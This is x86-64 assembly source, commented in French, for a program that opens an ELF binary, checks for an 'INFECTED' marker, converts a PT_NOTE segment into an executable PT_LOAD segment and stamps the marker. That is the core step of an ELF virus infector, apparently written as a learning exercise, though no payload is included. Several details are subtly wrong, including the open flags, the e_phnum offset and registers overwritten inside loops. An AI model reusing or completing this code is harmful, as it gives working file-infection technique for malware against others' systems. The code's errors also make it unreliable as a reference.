section .data
    magic_bytes db 0x7F, "ELF"    
    err_msg db "Ce n'est pas un fichier ELF valide", 10
    err_len equ $ - err_msg
    dir_msg db "C'est un répertoire", 10
    dir_len equ $ - dir_msg
    elf_msg db "C'est un fichier ELF.", 10
    elf_len equ $ - elf_msg
    mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RE", 10
    mod_len equ $ - mod_msg
    already_mod_msg db "Ce fichier a déjà été modifié", 10
    already_mod_len equ $ - already_mod_msg
    signature db "INFECTED", 0     
    sig_len equ $ - signature
    
section .bss
    fd resq 1
    filename resq 1        ; Pour stocker le nom du fichier
    elf_header resb 64
    stat_buf resb 144      ; Buffer pour stocker les informations stat
    phdr resb 56           ; Structure pour stocker un program header          
    note_data resb 1024    ; Buffer pour sauvegarder les données du segment NOTE
    sig_buf resb 9        

section .text
global _start

_start:
    ; Récupérer le premier argument (nom du fichier)
    pop rdi                 ; Nombre d'arguments
    pop rdi                 ; Nom du programme
    pop rdi                 ; Premier argument (nom du fichier)
    mov [filename], rdi     ; Sauvegarder le nom du fichier
    
    ; Appel système stat pour obtenir les informations du fichier
    mov rax, 4             ; sys_stat             
    mov rsi, stat_buf
    syscall
    test rax, rax          ; Vérifier si stat a réussi
    js exit                ; Si erreur, sortir
    
    ; Vérifier si le fichier est un répertoire
    mov rax, qword [stat_buf + 24]  ; Charger st_mode
    and rax, 0o170000
    cmp rax, 0o040000
    je is_directory                 ; Sauter si répertoire

    ; Ouvrir le fichier en lecture seule
    mov rdi, [filename]
    mov rax, 2              ; sys_open
    mov rsi, 2              ; O_RDONLY
    syscall
    cmp rax, 0
    jl exit
    mov [fd], rax           ; Sauvegarder le descripteur
    
    ; Lire l'en-tête ELF
    mov rdi, rax
    mov rax, 0              ; sys_read
    mov rsi, elf_header
    mov rdx, 64
    syscall
    
    ; Vérifier les bytes magiques ELF
    mov rsi, elf_header
    mov rdi, magic_bytes
    mov rcx, 4
    repe cmpsb
    jne not_elf
    
    ; Afficher que c'est un fichier ELF
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, elf_msg
    mov rdx, elf_len
    syscall

    ; Vérifier si le fichier a déjà été modifié
    movzx rcx, word [elf_header + 56]  ; e_phnum
    mov rbx, 0                          

check_if_modified:
    cmp rbx, rcx
    jge scan_headers      ; Passer si tous les headers sont vérifiés

    ; Calculer l'offset du Program Header courant
    movzx rax, word [elf_header + 54]  ; e_phentsize
    mul rbx
    add rax, qword [elf_header + 32]   ; e_phoff  
    
    ; Lire le Program Header
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    ; Lire la signature potentielle à la fin du segment
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]
    add rsi, qword [phdr + 32]
    sub rsi, sig_len
    xor rdx, rdx
    mov rax, 8              ; sys_lseek                        
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, sig_buf
    mov rdx, sig_len
    syscall
    
    ; Comparer la signature
    mov rsi, sig_buf
    mov rdi, signature
    mov rcx, sig_len
    repe cmpsb
    je file_already_modified    ; Sauter si déjà modifié
    
    inc rbx
    jmp check_if_modified

scan_headers:
    ; Rechercher un segment PT_NOTE à modifier
    movzx rcx, word [elf_header + 56]  
    mov rbx, 0                         

find_pt_note:
    cmp rbx, rcx
    jge exit

    ; Calculer l'offset du Program Header
    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    ; Lire le Program Header
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    ; Vérifier si c'est un PT_NOTE
    mov eax, dword [phdr]
    cmp eax, 4              ; PT_NOTE
    je modify_header        ; Modifier si PT_NOTE
    
    inc rbx
    jmp find_pt_note

modify_header:
    ; Sauvegarder les données du segment NOTE
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    xor rdx, rdx                       
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                          
    mov rsi, note_data
    mov rdx, qword [phdr + 32]        
    syscall
    
    ; Modifier le type et les permissions du segment
    mov dword [phdr], 1      ; PT_LOAD
    mov dword [phdr + 4], 5  ; PF_R | PF_X
    
    ; Écrire le header modifié
    mov rdi, [fd]
    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    mov rdi, [fd]
    mov rsi, rax
    xor rdx, rdx
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 1              ; sys_write                         
    mov rsi, phdr
    mov rdx, 56
    syscall
    
    ; Réécrire les données originales du segment
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    xor rdx, rdx
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 1              ; sys_write                         
    mov rsi, note_data
    mov rdx, qword [phdr + 32]        
    syscall
    
    ; Ajouter la signature à la fin du segment
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]         
    add rsi, qword [phdr + 32]        
    sub rsi, sig_len                  
    xor rdx, rdx
    mov rax, 8              ; sys_lseek                          
    syscall
    
    mov rdi, [fd]
    mov rax, 1              ; sys_write                        
    mov rsi, signature
    mov rdx, sig_len
    syscall
    
    ; Informer l'utilisateur de la modification
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, mod_msg
    mov rdx, mod_len
    syscall
    jmp exit

file_already_modified:
    ; Informer que le fichier est déjà modifié
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, already_mod_msg
    mov rdx, already_mod_len
    syscall
    jmp exit

is_directory:
    ; Informer que le chemin est un répertoire
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, dir_msg
    mov rdx, dir_len
    syscall
    jmp exit

not_elf:
    ; Informer que ce n'est pas un fichier ELF valide
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, err_msg
    mov rdx, err_len
    syscall
    jmp exit

exit:
    ; Fermer le descripteur de fichier si ouvert
    mov rax, 3              ; sys_close
    syscall
    
    ; Quitter le programme
    mov rax, 60             ; sys_exit
    xor rdi, rdi            ; Code de retour 0
    syscall